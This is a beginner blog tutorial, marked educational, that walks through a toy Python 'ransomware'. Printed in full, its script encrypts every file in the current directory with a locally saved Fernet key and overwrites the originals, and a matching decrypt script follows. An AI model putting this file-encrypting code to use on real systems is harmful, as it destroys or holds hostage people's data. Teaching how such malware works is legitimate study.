<!-- wp:paragraph {"align":"center"} -->
<p class="has-text-align-center"><strong>Introduction</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><em>For educational purposes only</em></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>This article showcases a simple python ransomware one can create in order to educate on the concepts of malware. It consists of utilizing the following python modules:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>os <a href="https://docs.python.org/3/library/os.html" data-type="URL" data-id="https://docs.python.org/3/library/os.html" target="_blank" rel="noreferrer noopener">https://docs.python.org/3/library/os.html</a></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>cryptography</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Fernet <a href="https://cryptography.io/en/latest/fernet/" data-type="URL" data-id="https://cryptography.io/en/latest/fernet/" target="_blank" rel="noreferrer noopener">https://cryptography.io/en/latest/fernet/</a></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>The program is conducted in the Linux environment and it is advisable to test this program in a virtual machine.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph {"align":"center","backgroundColor":"pale-cyan-blue"} -->
<p class="has-text-align-center has-pale-cyan-blue-background-color has-background"><strong>Part I</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph {"fontSize":"small"} -->
<p class="has-small-font-size"><strong>Step 1</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>First let's create some files to be encrypted for this program.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4016,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-14.png?w=1024" alt="" class="wp-image-4016"/><figcaption class="wp-element-caption">3 text files as an example.</figcaption></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph {"fontSize":"small"} -->
<p class="has-small-font-size"><strong>Step </strong>2</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Let's start writing out script.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>This part of the program finds actual files in the directory and adds them to a list.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4018,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-15.png?w=1024" alt="" class="wp-image-4018"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><em>os.listdir() function </em></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4021,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-17.png?w=801" alt="" class="wp-image-4021"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":4019,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-16.png?w=802" alt="" class="wp-image-4019"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph {"fontSize":"small"} -->
<p class="has-small-font-size"><strong>Step </strong>3</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Import the key to encrypt the files.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4025,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-19.png?w=727" alt="" class="wp-image-4025"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":4023,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-18.png?w=718" alt="" class="wp-image-4023"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Generate the encryption key.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4027,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-20.png?w=1024" alt="" class="wp-image-4027"/><figcaption class="wp-element-caption"><em>**Remember to delete the print(key) once done testing.**</em></figcaption></figure>
<!-- /wp:image -->

<!-- wp:image {"id":4029,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-21.png?w=818" alt="" class="wp-image-4029"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph {"fontSize":"small"} -->
<p class="has-small-font-size"><strong>Step </strong>4</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Save the generated key in a file and add the key file to not be encrypted in the program.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4030,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-22.png?w=1024" alt="" class="wp-image-4030"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Test the newly added lines</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4031,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-23.png?w=1024" alt="" class="wp-image-4031"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph {"fontSize":"small"} -->
<p class="has-small-font-size"><strong>Step </strong>5</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Let's add the encryption code.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4035,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-25.png?w=1024" alt="" class="wp-image-4035"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><em>Fernet encryption function.</em></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4038,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-26.png?w=686" alt="" class="wp-image-4038"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Files are encrypted.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4033,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-24.png?w=1024" alt="" class="wp-image-4033"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph {"align":"center"} -->
<p class="has-text-align-center"><strong>The full encryption code</strong></p>
<!-- /wp:paragraph -->

<!-- wp:syntaxhighlighter/code {"language":"python"} -->
<pre class="wp-block-syntaxhighlighter-code">#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

# Locate files in the directory

files = []

for file in os.listdir():
        if file == 'encrypt.py'or file == 'encrypt.key':   # Not to decrypt the actual program
                continue
        if os.path.isfile(file):                           # Append any text files to the list
                files.append(file)

print(files)

key = Fernet.generate_key()

with open("encrypt.key","wb") as encryptkey:               # Make a file with write permissions
        encryptkey.write(key)                              # Write the encrypt key to the file

for file in files:
        with open(file,"rb") as contents:
                targets = contents.read()                 # Read the files
        targets_encrypted = Fernet(key).encrypt(targets)  # Encrypts all the files
        with open(file,"wb") as contents:                 # Write the files
                contents.write(targets_encrypted)         # Write the encrypted data to the files
</pre>
<!-- /wp:syntaxhighlighter/code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph {"align":"center","backgroundColor":"pale-cyan-blue"} -->
<p class="has-text-align-center has-pale-cyan-blue-background-color has-background"><strong>Part II</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Let's create our decrypt program which is similar to our encrypt program.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph {"fontSize":"small"} -->
<p class="has-small-font-size"><strong>Step 1</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Copy the encrypt program to a new file calldecrypt.py.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4040,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-27.png?w=1024" alt="" class="wp-image-4040"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph {"fontSize":"small"} -->
<p class="has-small-font-size"><strong>Step </strong>2</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Edit the file with the following:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>Remove the generate key function</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Save the encryption key to a new variable</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Edit the Fernet function to decrypt </li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Change the write function to the decrypted content</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:image {"id":4046,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-30.png?w=1024" alt="" class="wp-image-4046"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><em>Fernet decryption function.</em></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4050,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-32.png?w=699" alt="" class="wp-image-4050"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph {"backgroundColor":"vivid-red"} -->
<p class="has-vivid-red-background-color has-background"><strong><em>**Before running the decrypt program , remember to add decrypt.py file in the encrypt.py file list**</em></strong></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4045,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-29.png?w=1024" alt="" class="wp-image-4045"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph {"align":"center"} -->
<p class="has-text-align-center"><strong>The full decryption code</strong></p>
<!-- /wp:paragraph -->

<!-- wp:syntaxhighlighter/code {"language":"python"} -->
<pre class="wp-block-syntaxhighlighter-code">#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

# Locate files in the directory

files = []

for file in os.listdir():
        if file == 'encrypt.py'or file == 'encrypt.key' or file =='decrypt.py':   # Not to decrypt the actual program
                continue
        if os.path.isfile(file):                           # Append any text files to the list
                files.append(file)

print(files)

with open("encrypt.key","rb") as key:                           # Add the key to a variable secretkey
        secretkey = key.read()

for file in files:
        with open(file,"rb") as contents:
                targets = contents.read()                       # Read the files
        targets_decrypted = Fernet(secretkey).decrypt(targets)  # Encrypts all the files
        with open(file,"wb") as contents:                       # Write the files
                contents.write(targets_decrypted)               # Write the encrypted data to the files</pre>
<!-- /wp:syntaxhighlighter/code -->

<!-- wp:paragraph -->
<p>Files are decrypted.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4047,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-31.png?w=1024" alt="" class="wp-image-4047"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Let's test the entire process again.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4064,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-33.png?w=1024" alt="" class="wp-image-4064"/></figure>
<!-- /wp:image -->
